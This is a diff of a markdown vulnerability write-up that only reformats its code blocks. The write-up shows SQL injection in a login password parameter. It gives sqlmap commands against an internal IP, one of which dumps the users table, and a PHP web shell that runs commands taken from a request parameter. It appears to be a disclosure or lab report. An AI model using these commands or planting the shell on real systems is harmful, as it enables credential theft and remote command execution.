@@ -20,15 +20,18 @@ A SQL Injection (SQLi) vulnerability was discovered in the `password` parameter 
   ![Screenshot 2025-05-30 230336](https://github.com/user-attachments/assets/2b691c47-a02e-47db-8b2b-e884e2648424)
 
   - SQLMap can be used now , because it is vulnerable by sqli by manual testing.
-  
-  ```bash sqlmap -u "http://192.168.1.45/admin" --data "username=admin&password=admin123" -p password --risk=3 --level=5 --batch```
+  ```bash
+      sqlmap -u "http://192.168.1.45/admin" --data "username=admin&password=admin123" -p password --risk=3 --level=5 --batch
+  ```
 
   ![Screenshot 2025-05-31 204224](https://github.com/user-attachments/assets/bac3fb25-9db2-4ad0-9045-bcb1d8645600)
 
   
   - SQLMap was used against the login endpoint by specifying the vulnerable parameters and dumped user credentials.
   
-  ```bash sqlmap -u "http://192.168.1.45/admin" --data "username=admin&password=admin123" -p password -T users --dump --batch```
+  ```bash
+      sqlmap -u "http://192.168.1.45/admin" --data "username=admin&password=admin123" -p password -T users --dump --batch
+  ```
 
   ![Screenshot 2025-05-31 204420](https://github.com/user-attachments/assets/cb14eb27-4781-4aaa-9a0d-59b3ee146c54)
 
@@ -82,7 +85,9 @@ Using the uploaded PHP shell, an attacker can execute system commands. This lead
 
 
 **Payload**:
-- Reverse shell: ```bash <?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>```
+- Reverse shell: ```bash
+                    <?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>
+                 ```
 
   ![Screenshot 2025-05-31 211904](https://github.com/user-attachments/assets/fda305c9-4c7e-4620-b1ad-d1d50f675444)
 
